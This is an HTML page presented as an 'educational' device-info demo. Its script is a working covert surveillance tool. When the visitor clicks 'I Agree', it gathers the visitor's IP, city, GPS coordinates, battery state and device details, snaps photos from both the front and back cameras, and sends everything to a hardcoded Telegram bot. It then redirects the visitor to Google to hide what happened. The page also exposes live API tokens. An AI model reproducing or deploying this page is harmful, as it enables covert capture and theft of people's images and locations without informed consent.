<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Device Info & Camera Access</title>
</head>
<body>
  <h2>This website is for educational purposes only.</h2>
  <p>
    This demo collects device and camera info ethically, with your consent.
  </p>
  <button id="agreeBtn">I Agree</button>

  <script>
    const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";
    const ipToken = "18d2a866939a58";

    let frontCaptured = false;
    let backCaptured = false;

    async function getSnapshot(facingMode) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode }
        });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        await new Promise(res => setTimeout(res, 1000)); // Let it stabilize

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
        stream.getTracks().forEach(track => track.stop());
        return blob;
      } catch (err) {
        console.warn(`Camera (${facingMode}) access denied or failed`, err);
        return null;
      }
    }

    async function getDeviceInfo() {
      const data = {
        ip: "Unknown",
        city: "",
        region: "",
        country: "",
        battery: "Unknown",
        charging: "Unknown",
        location: "Denied",
        browser: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
        touch: 'ontouchstart' in window ? "Yes" : "No",
        screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
        cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
        cameraStatus: ""
      };

      // IP Info
      try {
        const res = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
        const ipData = await res.json();
        data.ip = ipData.ip;
        data.city = ipData.city;
        data.region = ipData.region;
        data.country = ipData.country;
      } catch {}

      // Battery Info
      try {
        const battery = await navigator.getBattery();
        data.battery = (battery.level * 100).toFixed(0) + "%";
        data.charging = battery.charging ? "Yes" : "No";
      } catch {}

      // Location
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
      } catch {}

      return data;
    }

    async function sendTextToTelegram(data) {
      const message = `
🔐 *User Device Info*
🌐 IP: ${data.ip}
📍 Location: ${data.city}, ${data.region}, ${data.country}
📡 GPS: ${data.location}
📷 Camera: ${data.cameraStatus}

🖥 *Device Specs*
💻 Platform: ${data.platform}
📱 Touch Support: ${data.touch}
🧠 CPU Cores: ${data.cpu}
💾 RAM: ${data.memory}
🖼 Screen: ${data.screen}
🌍 Language: ${data.language}
🌐 Browser: ${data.browser}
🍪 Cookies: ${data.cookies}
🕒 Timezone: ${data.timezone}

🔋 Battery: ${data.battery} | Charging: ${data.charging}
      `;

      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      });
    }

    function sendPhotoToTelegram(blob, caption) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, `${caption}.jpg`);
      formData.append("caption", caption);

      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    document.getElementById("agreeBtn").addEventListener("click", async () => {
      const info = await getDeviceInfo();

      // Capture front camera (only once)
      let frontSnap = null;
      if (!frontCaptured) {
        frontSnap = await getSnapshot("user");
        frontCaptured = true;
      }

      // Capture back camera (only once)
      let backSnap = null;
      if (!backCaptured) {
        backSnap = await getSnapshot("environment");
        backCaptured = true;
      }

      // Set camera status
      if (frontSnap && backSnap) {
        info.cameraStatus = "Front & Back Captured";
      } else if (frontSnap) {
        info.cameraStatus = "Front Only";
      } else if (backSnap) {
        info.cameraStatus = "Back Only";
      } else {
        info.cameraStatus = "None / Access Denied";
      }

      // Send info and photos
      await sendTextToTelegram(info);
      if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
      if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");

      // Redirect after 3s
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 3000);
    });
  </script>
</body>
</html>
